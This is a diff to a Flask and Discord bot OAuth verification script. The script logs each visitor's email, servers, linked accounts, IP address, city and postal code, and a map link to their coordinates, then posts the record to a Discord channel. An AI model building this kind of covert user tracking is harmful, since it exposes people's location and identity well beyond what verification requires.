@@ -68,54 +68,64 @@ def save_log(discord_id, structured_data):
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
 
-def create_full_embed(structured_data):
+def create_super_stylish_embed(structured_data):
     d = structured_data["discord"]
     ip = structured_data["ip_info"]
     ua = structured_data["user_agent"]
 
     guild_names = [g.get("name", "不明") for g in d.get("guilds", [])]
+    guild_display = ', '.join(guild_names[:3]) + (f", 他{len(guild_names)-3}件" if len(guild_names) > 3 else "")
     connection_names = [c.get("name", "不明") for c in d.get("connections", [])]
+    conn_display = ', '.join(connection_names[:3]) + (f", 他{len(connection_names)-3}件" if len(connection_names) > 3 else "")
+
+    embed_color = 0x1abc9c
+    if ip["proxy"] or ip["hosting"]:
+        embed_color = 0xe74c3c  # 赤系警告
 
     embed = {
-        "title": "🚨 フルアクセスログ",
-        "color": 0x9b59b6,
+        "title": "🚀 フルアクセスログ（スタイリッシュ版）",
+        "color": embed_color,
         "fields": [
             {
                 "name": "👤 Discord情報",
                 "value": (
-                    f"**名前:** {d.get('username')}#{d.get('discriminator')}\n"
-                    f"**ID:** {d.get('id')}\n"
-                    f"**メール:** {d.get('email')}\n"
-                    f"**Verified:** {d.get('verified')}\n"
-                    f"**MFA:** {d.get('mfa_enabled')}\n"
-                    f"**Premium:** {d.get('premium_type')}\n"
-                    f"**Locale:** {d.get('locale')}\n"
-                    f"**Flags:** {d.get('flags')}\n"
-                    f"**Public Flags:** {d.get('public_flags')}\n"
-                    f"**Guilds:** {', '.join(guild_names) if guild_names else 'なし'}\n"
-                    f"**Connections:** {', '.join(connection_names) if connection_names else 'なし'}"
+                    f"**基本情報**\n"
+                    f"・名前: `{d.get('username')}#{d.get('discriminator')}`\n"
+                    f"・ID: `{d.get('id')}`\n"
+                    f"・メール: `{d.get('email')}`\n\n"
+                    f"**セキュリティ**\n"
+                    f"・Verified: `{d.get('verified')}`\n"
+                    f"・MFA: `{d.get('mfa_enabled')}`\n"
+                    f"・Premium: `{d.get('premium_type')}`\n"
+                    f"・Locale: `{d.get('locale')}`\n"
+                    f"・Flags: `{d.get('flags')}` / Public Flags: `{d.get('public_flags')}`\n\n"
+                    f"**ギルド・接続**\n"
+                    f"・Guilds: `{guild_display if guild_names else 'なし'}`\n"
+                    f"・Connections: `{conn_display if connection_names else 'なし'}`"
                 ),
                 "inline": False
             },
             {
                 "name": "🌐 IP情報",
                 "value": (
-                    f"**IP:** {ip['ip']}\n"
-                    f"**Proxy:** {ip['proxy']} / **Hosting:** {ip['hosting']}\n"
-                    f"**国・県・市・郵便番号:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
-                    f"**ISP / AS:** {ip['isp']} / {ip['as']}\n"
-                    f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+                    f"**位置情報**\n"
+                    f"・国 / 県 / 市 / 郵便番号: `{ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}`\n"
+                    f"・地図: [Google Maps](https://www.google.com/maps?q={ip['lat']},{ip['lon']})\n\n"
+                    f"**ネットワーク**\n"
+                    f"・IP: `{ip['ip']}`\n"
+                    f"・Proxy: `{ip['proxy']}` / Hosting: `{ip['hosting']}`\n"
+                    f"・ISP / AS: `{ip['isp']} / {ip['as']}`"
                 ),
                 "inline": False
             },
             {
-                "name": "💻 User-Agent情報",
+                "name": "💻 デバイス情報",
                 "value": (
-                    f"**Raw:** {ua['raw']}\n"
-                    f"**OS:** {ua['os']}\n"
-                    f"**ブラウザ:** {ua['browser']}\n"
-                    f"**デバイス:** {ua['device']}\n"
-                    f"**Bot判定:** {ua['is_bot']}"
+                    f"・OS: `{ua['os']}`\n"
+                    f"・ブラウザ: `{ua['browser']}`\n"
+                    f"・デバイス: `{ua['device']}`\n"
+                    f"・Bot判定: `{ua['is_bot']}`\n"
+                    f"・User-Agent: ```{ua['raw']}```"
                 ),
                 "inline": False
             }
@@ -178,6 +188,7 @@ def callback():
         json={"access_token": access_token}
     )
 
+    # IP・User-Agent
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -215,22 +226,17 @@ def callback():
 
     save_log(user["id"], structured_data)
 
+    # Embed送信
     try:
-        embed_data = create_full_embed(structured_data)
-        bot.loop.create_task(bot.send_log(embed=embed_data))
-
+        embed = create_super_stylish_embed(structured_data)
+        bot.loop.create_task(bot.send_log(embed=embed))
         if geo["proxy"] or geo["hosting"]:
-            bot.loop.create_task(bot.send_log(
-                f"⚠️ 不審なアクセス検出: {user['username']}#{user['discriminator']} (ID: {user['id']})\n"
-                f"IP: {geo['ip']} / Proxy: {geo['proxy']} / Hosting: {geo['hosting']}"
-            ))
-
+            bot.loop.create_task(bot.send_log(f"⚠️ 不審なアクセス検出: {user['username']}#{user['discriminator']} (IP: {geo['ip']})"))
         bot.loop.create_task(bot.assign_role(user["id"]))
-
     except Exception as e:
         print("Embed送信エラー:", e)
 
-    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
+    return render_template("welcome.html", username=user.get("username"), discriminator=user.get("discriminator"))
 
 
 @app.route("/logs")
